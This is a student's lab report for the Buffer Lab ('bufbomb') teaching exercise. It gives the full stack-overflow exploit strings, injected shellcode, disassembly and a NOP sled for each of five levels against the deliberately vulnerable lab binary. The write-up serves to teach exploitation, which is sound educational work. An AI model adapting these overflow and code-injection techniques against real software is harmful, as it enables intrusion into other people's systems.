### Report for Buffer Lab        

#### Bin Liu (2014013466)



##### Level 0: Candle

This problem is easy but important because it's the fundamental of all other 4 problems. After we disassemble “bufbomb”, we can find out that the buffer size is 0x28 = 40 and the entry address of function `smoke` is *0x08048b04*. 

We can illustrate the stack state as follows:

 <img src="pictures\stack1.jpg" height="30%">

So we can get the exploit string as follows:

> 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 2324 25 26 27 28 29 30 31 32 33 34 	35 36 37 38 39 40 41 42 43 44 04 8b 04 08

The front 44 codes are to override the buffer and **`EBP`** value in stack, which can be replaced by any code except `00 `. The last 4 codes are to override the return address. The only thing that we should pay attention to is **byte ordering**!

 

##### Level 1: Sparkler

In the disassembling code of bufbomb, function fizz gets the parameter by following code:

````assembly
mov 0x8(%ebp),%edx
````

We just need to override the return address and write cookie value to address `ebp+0x8`, where `ebp` in function `fizz` exactly equals *`ebp`* in getbuf plus 8. So we can get the exploit string as follows:

> 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 3031 32 33 34 35 36 37 38 39 40 41 42 43 44 2e 8b 04 08 4d bd 7e 79 4d bd 7e 79

The front 44 codes are to override the buffer and **`EBP`** value in stack. The subsequent 4 codes `2e 8b 04 08` are to override the return address. The last 4 codes `4d bd 7e 79` are to write cookie to address `ebp+0x8` to make parameter `val` of function fizz equals to value of `cookie`.

##### Level 2: Firecracker

In this problem, we need to supply a string that encodes actual machine instructions. First, we need write an assembly code to override the `global_value` and jump to function `bang`.

```assembly
movl 0x0804e104, %eax ;0x0804e104 is the address of cookie
movl $0x0804e10c, $ebx ;0x0804e10c is the address of global_value
movl %eax, %ebx	;override the value of global_value
pushl $0x08048b82 ;push the address of function bang into stack
ret ;call ret to jump to function bang.
```

 The address of `cookie` and `global_value` can be found in the disassembling code of bufbomb. After finish assembly code, we should compile it to an object file and dump the object file to disassembling code to get the machine instructions.

```assembly
firecracker.o:     file format elf32-i386
Disassembly of section .text:
00000000 <.text>:
    0:›  a1 04 e1 04 08       ›  mov    0x804e104,%eax
    5:›  bb 0c e1 04 08       ›  mov    $0x804e10c,%ebx
    a:›  89 03                ›  mov    %eax,(%ebx)
    c:›  68 82 8b 04 08       ›  push   $0x8048b82
    11:›  c3                  ›  ret
```

At last, we just need to construct exploit string to insert the machine instructions to stack and override the return address of getbuf to the start of the inserted machine instructions.

> a1 04 e1 04 08 bb 0c e1 04 08 89 03 68 82 8b 04 08 c3 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 d8 35 68 55

The front 18 codes are machine instructions and last 4 codes are address `ebp-0x28`, where the value of`ebp` are avaliable with gdb and `0x28` is the buffer size.

##### Level 3: Dynamite 

Similar to level 2, firstlly we should write an assembly code to override the value in `eax` and recover the `ebp`.

```assembly
movl 0x0804e104, %eax ;override the value in eax to return. 0x0804e104 is the address of cookie
movl $0x55683630, %ebp ;recover the value of ebp. 0x55683630 is the old value of ebp.
pushl $0x08048bf3 ;push the address of function test
ret ;call ret to jump to function test
```

The dump result is 

```assembly
Dynamite.o:     file format elf32-i386
Disassembly of section .text:
00000000 <.text>:
   0:›  a1 04 e1 04 08       ›  mov    0x804e104,%eax
   5:›  bd 30 36 68 55       ›  mov    $0x55683630,%ebp
   a:›  68 f3 8b 04 08       ›  push   $0x8048bf3
   f:›  c3                   ›  ret
```

So the exploit string can be:

> a1 04 e1 04 08 bd 30 36 68 55 68 f3 8b 04 08 c3 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 d8 35 68 55

##### Level 4: Nitroglycerin

Also similar to level 2, firstly we should write an assembly code to:

1.  recover the value of ebp; 

2.  override the value in eax which will be return to function testn

3.  jump to testn.

There are two differences with Level 3:

1. `ebp` is not stable. Hence we can not get the value of `ebp` with gdb. 
2. The assemble code should return to function `testn` instead of `test`.

The second is easy to solve by referring to disassembling code. Then we just need to determine the value of `ebp`. According to the first 3 lines of disassembling code of function testn,  we can conclude that `esp = ebp - 0x28`.

```assembly
8048c54:›  55         ›  push   %ebp
8048c55:›  89 e5      ›  mov    %esp,%ebp
8048c57:›  83 ec 28   ›  sub    $0x28,%esp
```

Therefore we can write the following assembly code:

```assembly
lea 0x28(%esp), %ebp ;recover the value of ebp.
mov 0x0804e104, %eax ;override the value ob eax with cookie.
push $0x08048c67 ;push the address of next instructions of `call getbufn` in function testn.
ret	;call ret to jump back to testn.
```

The dump reslut is:

```assembly
Nitroglycerin.o:     file format elf32-i386
Disassembly of section .text:
00000000 <.text>:
   0:›  8d 6c 24 28          ›  lea    0x28(%esp),%ebp
   4:›  a1 04 e1 04 08       ›  mov    0x804e104,%eax
   9:›  68 67 8c 04 08       ›  push   $0x8048c67
   e:›  c3                   ›  ret
```

The exploit string is:

> 90(repeat 505 times) 8d 6c 24 28 a1 04 e1 04 08 68 67 8c 04 08 c3 90 90 90 90 c0 34 68 55

The first 505 codes are the code of the nop instruction. The subsequent 15 codes are the machine instruction of assembly code. The last 4 codes `c0 34 68 55` are the address `0x556834c0 = 0x55683630 - 0x170`, where `0x55683630` is the address of ebp in stable mode and `0x170` is a roughly value which guarantee that the disassembling code can be excuted robustly.